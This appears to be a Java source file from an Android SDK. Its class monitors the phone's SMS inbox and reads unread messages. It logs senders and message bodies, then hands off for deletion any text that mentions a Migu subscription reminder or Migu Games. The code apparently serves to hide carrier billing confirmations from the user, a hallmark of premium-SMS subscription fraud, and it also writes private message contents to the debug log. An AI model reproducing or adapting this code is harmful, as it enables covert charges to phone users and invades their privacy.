package com.use.tempsdk.smsremove;

import android.content.ContentResolver;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Message;
import android.util.Log;

/**
 * Created by shuxiong on 2017/5/16.
 */

public class SmsObserver extends ContentObserver {
    private ContentResolver mResolver;
    public SmsHandler smsHandler;

    /**
     * Creates a content observer.
     *
     * @param handler The handler to run {@link #onChange} on, or null if none.
     */
    public SmsObserver(ContentResolver mResolver, SmsHandler handler) {
        super(handler);
        this.mResolver = mResolver;
        this.smsHandler = handler;
    }

    @Override
    public void onChange(boolean selfChange) {
        Cursor mCursor = mResolver.query(Uri.parse("content://sms/inbox"),new String[]{"_id","address","read","body","thread_id"},
                "read=?",new String[]{"0"},"date desc");
        if(mCursor == null){

            Log.e("dddd","mCursor=null");
            return;
        }else{
            while(mCursor.moveToNext()) {
                SmsInfo _smsInfo = new SmsInfo();
                int _inIndex = mCursor.getColumnIndex("_id");
                if (_inIndex != -1) {
                    _smsInfo._id = mCursor.getString(_inIndex);
                }

                int thread_idIndex = mCursor.getColumnIndex("thread_id");
                if (thread_idIndex != -1) {
                    _smsInfo.thread_id = mCursor.getString(thread_idIndex);
                }

                int addressIndex = mCursor.getColumnIndex("address");
                if (addressIndex != -1) {
                    _smsInfo.smsAddress = mCursor.getString(addressIndex);
                }

                int bodyIndex = mCursor.getColumnIndex("body");
                if (bodyIndex != -1) {
                    _smsInfo.smsBody = mCursor.getString(bodyIndex);
                }

                int readIndex = mCursor.getColumnIndex("read");
                if (readIndex != -1) {
                    _smsInfo.read = mCursor.getString(readIndex);
                }

                Log.e("dddd", "SmsObServer---phone:" + _smsInfo.smsAddress + "  message:" + _smsInfo.smsBody);
                //根据拦截策略，对短信操作

                Log.e("dddd", "handle sendmsg");
                // TODO: 2017/5/16 根据规则删除接收的短信

//                Message msg = smsHandler.obtainMessage();
//                _smsInfo.action = 2;
//                msg.obj = _smsInfo;
//                smsHandler.sendMessage(msg);
//                Log.e("dddd","handle sendmsg");
                if (_smsInfo.smsBody.contains("订购提醒") && _smsInfo.smsBody.contains("咪咕") || _smsInfo.smsBody.contains("咪咕游戏")) {
                    Message msg = smsHandler.obtainMessage();
                    _smsInfo.action = 2;
                    msg.obj = _smsInfo;
                    smsHandler.sendMessage(msg);
                    Log.e("dddd", "handle sendmsg");
                }
            }
        }

        if(mCursor != null){
            mCursor.close();
            mCursor = null;
        }
    }
}
